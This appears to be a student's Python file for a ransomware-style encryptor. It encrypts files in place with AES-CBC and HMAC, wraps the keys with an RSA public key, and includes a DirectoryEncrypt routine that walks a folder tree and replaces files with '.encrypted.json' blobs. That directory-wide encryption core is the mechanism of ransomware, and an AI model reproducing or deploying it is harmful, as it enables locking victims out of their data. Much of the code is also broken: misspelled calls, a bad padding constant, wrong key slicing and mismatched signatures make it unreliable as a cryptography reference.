import os
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.primitives import padding, asymmetric
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives import hashes, hmac, serialization
from cryptography.hazmat.primitives.asymmetric import rsa
import json


CONST_RSA_KEY_SIZE = 2048
CONST_INDENT_SIZE = 4
CONST_PADDING_BITS = 128
CONST_KEY_BYTES= 32
KEY_LENGTH = 32
RSA_KEY_SIZE = 2048
IV_LENGTH = 16
PUBLIC_EXPONENT = 65537
RSA_PUBLIC_KEY_PATH = ".\RSApublickey.pem"
RSA_PRIVATE_KEY_PATH = ".\RSAprivatekey.pem"


def MyEncrypt(message, key):
    #checking key length
    if(len(key) < KEY_LENGTH):
        raise ValueError("Key less than 32 Bytes!")
    
    #assigning values
    IV = os.urandom(IV_LENGTH)
    backend = default_backend()
    
    #initialize padder
    padder = padding.PKCS7(CONST_PADDING_BITS).padder()
    
    #pad data to fit block size
    message = padder.update(message) + padder.finalize()
    
    #create cipher object
    cipher = Cipher(algorithms.AES(key), modes.CBC(IV), backend=backend)
    
    #make encryptor
    encryptor = cipher.encryptor()
    
    #encrypt message
    C = encryptor.update(message) + encryptor.finalize()
    return C, IV

def MyFileEncrypt(filepath):
    #generating key
    key = os.urandom(KEY_LENGTH)
    #Exclude private key, public key, and executable from encrypt

    #getting file name and extension
    filename_ext = os.path.basename(filepath) #gets file name with extension from path
    filename, ext = os.path.splitext(filename_ext) #separates file name and extension
    
    # loop throughh all files:
    #for file in files:
        #Retrieve full filepath
        #filepath = pathTofile + "\\" + file
        
    #reading file
    file = open(filepath, "rb")
    m = file.read()
    file.close()
    
    #calling encryption method
    C, IV = MyEncrypt(m, key)
    
    file = open(filepath, "wb")
    file.write(C)
    file.close()
    
    return C, IV, key, ext



def MyEncryptMAC(message, EncKey, HMACKey):
    
    #get ciphertext and IV
    C, IV = MyEncrypt(message, EncKey)
    
    #create HMAC object to make tag
    h = hmac.HMAC(HMACKey, hashes.SHA256(), backend=default_backend())
    h.update(C)
    tag = h.finalize()
    
    return C, IV, tag


def MyFileEncryptMAC(filepath):
    
    #create Keys
    KeyLength = 32
    HMACKey = os.urandom(KEY_LENGTH)
    EncKey = os.urandom(KEY_LENGTH)
    
    if len(EncKey) < KeyLength:
        raise Exception("EncKey less than 32 bytes!")
    if len(HMACKey) < KeyLength:
        raise Exception("HMACKey less than 32 bytes!")
    
    #open and read file to encrypt
    file = open(filepath, "rb")
    m = file.read()
    file.close()
    
    #getting file name and extension
    filename_ext = os.path.basename(filepath) #gets file name with extension from path
    filename, ext = os.path.splitext(filename_ext) #separates file name and extension
    
    #encrypt & MAC
    C, IV, tag = MyEncryptMAC(m, EncKey, HMACKey)
    
    '''Not used for RSA
    #storing values
    encData = {"RSACipher": RSACipher.decode('cp437'),"C": C.decode('cp437'), "IV": IV.decode('cp437'),  "ext": ext, "tag": tag.decode('cp437')}
    
    #create and write to json
    filenameJSON = filename + ".json"
    
    #write json data to file
    with open(filenameJSON, "w") as outfile:
        json.dump(encData, outfile)
        outfile.close()
    
    #delete original file
    os.remove(filepath)
    '''
    
    return C, IV, tag, EncKey, HMACKey, ext

def CheckRSAKeys(): # check if pem file exist
    publicExists = os.path.isfile(RSA_PUBLIC_KEY_PATH)
    privateExists = os.path.isfile(RSA_PRIVATE_KEY_PATH)
    
    if not publicExists or not privateExists:
        #generate and store private key
        privateKey = rsa.generate_private_key(
            public_exponent = PUBLIC_EXPONENT,
            key_size = RSA_KEY_SIZE,
            backend=default_backend()
            )
        
        privatepem = privateKey.private_bytes(
            encoding=serialization.Encoding.PEM,
            format=serialization.PrivateFormat.TraditionalOpenSSL,
            encryption_algorithm=serialization.NoEncryption()
        )
        
        with open(RSA_PRIVATE_KEY_PATH, "wb") as privateKeyFile:
            privateKeyFile.write(privatepem)
    
        #generate and store public key
        publicKey = privateKey.public_key()
        
        publicpem = publicKey.public_bytes(
            encoding=serialization.Encoding.PEM,
            format=serialization.PublicFormat.SubjectPublicKeyInfo
        )
        
        with open(RSA_PUBLIC_KEY_PATH, "wb") as publicKeyFile:
            publicKeyFile.write(publicpem)

            
# RSA Encrypt using AES CBC 256 Encryption with HMAC 
def MyRSAEncrypt(filepath, RSA_Publickey_filepath):

	(C, IV, tag, EncKey, HMACKey, ext) = MyFileEncryptMAC(filepath)
	
	key = EncKey + HMACKey

	with open(RSA_Publickey_filepath, 'rb') as key_file:
		public_key = serialization.load_pem_public_key(
			key_file.read(),
			backend = default_backend()
			)

		RSACipher = public_key.encrypt(
			key,
			asymmetric.padding.OAEP(
				mgf=asymmetric.padding.MGF1(algorithm=hashes.SHA256()),
				algorithm=hashes.SHA256(),
				label=None
				)
			)
		key_file.close()

	return (RSACipher, C, IV, tag, ext) 
   

# AES requires plain text and ciphertext to be a multiple of 16
# We pad it so that the message is a multiple of the IV, 16
def addPadding(encoded):
	
	# We pad it with 128 bits or 16 bytes
	padder = padding.PKCS7(CONST_KEY_BYTES.CONST_PADDING_BITS).padder()

	# update() pads the encoded message
	padded_encoded = padder.update(encoded)

	# .finalize () Returns the remainder of the data.
	padded_encoded += padder.finalize()
	return padded_encoded 
def DirectoryEncrypt(directory):
     try:
         key = CheckRSAKeys()
     except:
         print("Error: keys has issue")
         return
     try:
         for root, dirs, filres in os.walk(directory):
             for file in filres:
                 try:
                     RSACipher, C, IV, tag, ext = MyRSAEncrypt(os.path.join(root,file),key[0])
                 except:
                     print("Error: MyRSAEncrypt failed")
                     return
                         #create JSon file
                 try:
                     data= {'encrypted': [{'RSACipher':RSACipher, 'C': C, 'IV': IV, 'tag': tag, 'ext': ext}]}
                 except:
                     print("Error: Not able to create Json file")
                     return
                 try:
                    encryptedFilepath = os.path.splittext(file)[0] + ".encrypted" + ".json"
                    with open( encryptedFilepath, 'w')as jsonfile:
                        json.dump(data, jsonfile, indent=3)
                 except:
                    print("Error:Json file didnt create")
                    return
             for file in dirs:
                 try:
                     RSACipher,C, IV, tag = MyRSAEncrypt(os.ath.json(root,file),key[0])
                 except:
                     ("Error: MyRSAEncryptfailes:")
                 return
             #create JSON file
                 try:
                     data = {'encrypted': [{'RSACipher':RSACipher,'C':C,'IV':IV,'tag':tag,'ext':ext}]}
                 except:
                     print("Error: Json file didnt create")
                 return
                 try:
                     encryptedFilepath = os.path.splitext(file)[0] + ".encrypted" + ".json"
                     with open( encryptedFilepath, 'w') as jsonFile:
                         json.dump(data,jsonFile, indent=3)
                 except:
                         print("Error: Unable to create JSON file.")
                         return
     except:
             print("Directory doent excist")
             return


                     
                         
def MyDecrypt(C, IV, key):
    #make cipher
    backend = default_backend()
    cipher = Cipher(algorithms.AES(key), modes.CBC(IV), backend=backend)
    
    #make decryptor
    decryptor = cipher.decryptor()
    
    #decrypt ciphertext
    plaintext_padded = decryptor.update(C) + decryptor.finalize()

    #unpad message
    unpadder = padding.PKCS7(128).unpadder()
    plaintext = unpadder.update(plaintext_padded) + unpadder.finalize()
    
    return plaintext

def MyFileDecrypt(filepath, IV, key, ext):

     #getting file name and extension
    filename_ext = os.path.basename(filepath) #gets file name with extension from path
    filename, ext = os.path.splitext(filename_ext) #separates file name and extension
    
    file = open(filepath, "rb")
    C = file.read()
    file.close()

    message = MyDecrypt(C, IV, key)
    
    writefile = open(filepath, "wb")
    writefile.write(message)
    writefile.close()

    return message, IV, key

def MyDecryptMAC(C, IV, tag, HMACKey, EncKey):
    
    h = hmac.HMAC(HMACKey, hashes.SHA256(), backend=default_backend())
    h.update(C)
    verifyTag = h.finalize()
    
    if verifyTag != tag:
        raise Exception("Tags do not align")
    
    message = MyDecrypt(C, IV, EncKey)
    
    return message

def MyFileDecryptMAC(originalfilepath, HMACKey):

    #getting file name and extension
    filename_ext = os.path.basename(originalfilepath) #gets file name with extension from path
    filename, ext = os.path.splitext(filename_ext) #separates file name and extension
    
    jsonFile = filename + ".json"
    
    #open file to decrypt
    with open(jsonFile) as decryptFile:
        data = json.load(decryptFile)
        decryptFile.close()

    #getting data from dictionary
    C = (data['C']).encode('cp437')
    IV = (data['IV']).encode('cp437')
    tag = (data['tag']).encode('cp437')
    EncKey = (data['EncKey']).encode('cp437')
    message = MyDecryptMAC(C, IV, tag, HMACKey, EncKey)
    
     #write recovered data to file
    recoveredFile = open(originalfilepath, "wb")
    recoveredFile.write(message)
    recoveredFile.close()
    
    #remove json file
    os.remove(jsonFile)
    
    return message
# RSA Decrypt #  using AES CBC 256 Decryption with HMAC
    '''
def MyRSADecrypt(RSACipher, C, IV, tag, ext, RSA_Privatekey_filepath):
    (C, IV, tag, EncKey, HMACKey, ext) = MyFileEncryptMAC(filepath)
	
    key = EncKey + HMACKey

    with open(RSA_Publickey_filepath, 'rb') as key_file:
        public_key = serialization.load_pem_public_key(
            _file.read(),
            backend = default_backend()
            )

        RSACipher = public_key.encrypt(
            key,
            asymmetric.padding.OAEP(
                mgf=asymmetric.padding.MGF1(algorithm=hashes.SHA256()),
                algorithm=hashes.SHA256(),
                label=None
    				)
    			)
        key_file.close()

    return (RSACipher, C, IV, tag, ext)
'''
def MyRSADecrypt(filepath, RSACipher, C, IV, tag, ext, RSA_Privatekey_filepath):
     with open(RSA_Privatekey_filepath, 'rb') as key_file:
        private_key = serialization.load_pem_private_key(
            key_file.read(),
            password=None,
            backend = default_backend()
            )
        key = private_key.decrypt(RSACipher,asymmetric,padding.OAEP(
                mgf = asymmetric.padding.MGF1(algorithm=hashes.SHA256()),
                                   algorithm= hashes.SHA256(),
                                   label=None
                                   )
                )
        EncKey_start=0
        EncKey_end = int((len(key)/2))
        HMACKey_start=EncKey_end 
        HMACKey_end = int(len(key))
        EncKey= key[EncKey_start:HMACKey_end]
        key_file.close()
        HMACKey= ""
    
     MyFileDecryptMAC(filepath,EncKey, HMACKey, IV,tag)
     
    

def main():
    #testFile = "test.txt"
    testFile = "test_photo.jpg"
    
    '''Regular'''
    C, IV, key, ext = MyFileEncrypt(testFile)
    input("File encrypted! Press enter to decrypt.")
    
    MyFileDecrypt(testFile, IV, key, ext)
    print("\nFile decrypted!")
    
    '''HMAC'''
    #C, IV, tag, EncKey, HMACKey, ext = MyFileEncryptMAC(testFile)
    #input("File encrypted! Press enter to decrypt.")
    #MyFileDecryptMAC(testFile, HMACKey)
    #print("\nFile decrypted!")

    '''RSA'''
    
    CheckRSAKeys()
    
    #RSACipher, C, IV, tag, ext = MyRSAEncrypt(testFile, RSA_PUBLIC_KEY_PATH)
    #input("File encrypted! Press enter to decrypt.")
    
    #MyRSADecrypt(RSACipher, C, IV, tag, ext, RSA_Privatekey_filepath)
    #print("\nFile decrypted!")
    
main()
